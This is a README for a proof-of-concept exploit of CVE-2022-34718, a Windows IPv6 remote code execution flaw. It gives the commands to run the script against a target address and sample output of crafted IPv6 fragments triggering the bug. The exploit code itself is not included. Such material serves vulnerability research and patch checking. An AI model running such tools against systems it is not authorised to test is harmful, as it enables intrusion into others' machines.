# CVE-2022-34718 IPv6 Remote Code Execution exploit sample

This repository contains an exploit of CVE-2022-34718, a Remote Code Execution
(RCE) vulnerability in IPv6 on Windows systems.

## How to

Since the vulnerability requires specially crafted IPv6 packets, it depends on
the Scapy module and therefore needs to run as root. The recommended method to
run this PoC is through a virtual environment, like so:

```
# virtualenv PoC
# source PoC/bin/activate
(PoC) # pip3 install -r requirements.txt
(PoC) # python3 ipv6-rce-poc.py <target address>
```

The script will tell you if the target system is vulnerable to this exploit.

```
[...]
**** inner_frag_id: 0x24944eac
Preparing frags...
Sending 64 frags...
.
Sent 1 packets.
[...]
Sent 1 packets.
Now sending the last inner fragment to trigger the bug...
.
Sent 1 packets.
Success! The system is vulnerable...
